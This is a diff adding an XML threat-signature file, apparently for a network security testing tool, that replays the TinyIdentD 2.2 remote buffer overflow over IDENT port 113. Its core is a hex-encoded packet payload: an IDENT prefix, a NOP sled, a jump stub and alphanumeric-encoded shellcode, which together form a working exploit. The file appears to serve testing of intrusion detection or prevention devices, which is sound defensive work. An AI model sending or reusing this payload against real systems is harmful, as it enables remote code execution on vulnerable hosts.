@@ -1,0 +1,78 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="TinyIdentD &lt;= 2.2 Remote Buffer Overflow Exploit"/>
+    <EngDesc display="true" value="This threat is a standard buffer overflow for TinyIdentD,  this threat is delivered via IDENTD port 113."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="IDENT"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="TinyIDENTd"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="TinyIDENTd_TinyIDENTd"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="TinyIDENTd_TinyIDENTd_2.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/3925"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value="23981"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="381e8db2d8d3bbde1e0d081880866117"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633149605167968750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1179807254" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="IDENTDdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$IDENTDdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="EB202C203238203A20555345524944203A20554E4958203A209090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090EB0359EB05E8F8FFFFFF494949494949494948494949494949494949515A6A445850304130416B41415442324142324241304241584150384142754A49696C4B5851546550577045504E6B6735356C4E6B734C555571686771686F6C4B526F46784E6B514F713074417A4B30496C4B54746E6B76614A4E35614B706A394C6C4D546B70307454476A616A6A644D633179524A4B6964674B32746574666431654A456C4B714F31345771486B52466E6B644C526B4E6B314F776C5441686B4C4B576C6C4B57714A4B4E69414C657467744A6375614F3051746C4B615050304F754F303258644C4C4B7150544C4C4B7070576C4E4D6E6B735835584A4B36696C4B4D504C706770755037704C4B4538356C414F57416876535030566E696B486F736F30634B6270306858706F7A5774514F45386F68596E4F7A666E6277696F386773535241306C7173646E3535307870654550447713837C0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
